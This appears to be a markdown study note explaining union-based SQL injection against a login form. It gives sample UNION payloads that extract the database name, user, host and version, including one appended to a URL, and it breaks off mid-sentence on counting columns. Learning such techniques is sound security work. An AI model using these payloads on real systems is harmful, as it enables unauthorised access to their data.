# union-based sql injection
* attacker uses the `UNION` operator
* leverages said operator to combine the results of two or more `SELECT` statements into a single result which is, then, returned as part of the HTTP response
* say you have the db from [1-sql][def]
    * say the db is hooked to an app and the app has a log-in page
    * the login page has a form whose input fields are `username` and `password`
* the query in the BE will be

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
    ```

* we can use said query to retrieve unauthorised info eg. db name, host username, hostname, db version etc
    * matter of fact, we can make the db return info we feed to it viz:

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union select 1,2,3;
    ```

    * this query returns two rows: one with the username-password info and another with the numbers 1, 2 and 3
    * say, instead of 3, we pass `version()`

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union select 1, 2, version();
    ```

    * query returns the version info of the db in the third col of the second row
    * you get the gist; let's make this interesting...

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union select database(), user(), version();
    ```

    * query returns db name, host username + hostname and version info in the second row
    * you can attach the `union` part of the query to the URL

    ```
        <URL>union select database(), user(), version();
    ```

* how do you find out how many columns there are?
    * good question
    * two methods: brute-forcing and
[def]: ./1-sql.md